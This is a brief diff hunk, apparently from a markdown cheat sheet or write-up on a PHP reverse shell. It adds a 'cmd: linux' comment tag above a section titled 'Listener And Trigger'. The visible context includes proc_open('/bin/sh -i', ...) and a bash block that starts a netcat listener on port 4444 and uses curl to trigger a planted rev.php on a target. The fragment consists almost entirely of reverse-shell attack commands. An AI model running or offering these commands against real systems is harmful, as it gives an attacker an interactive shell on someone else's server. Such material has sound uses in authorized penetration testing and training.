@@ -21,6 +21,7 @@ $proc = proc_open('/bin/sh -i', array(
 
 ## Listener And Trigger
 
+<!-- cmd: linux -->
 ```bash
 nc -lvpn 4444
 curl http://$TARGET/dev/rev.php
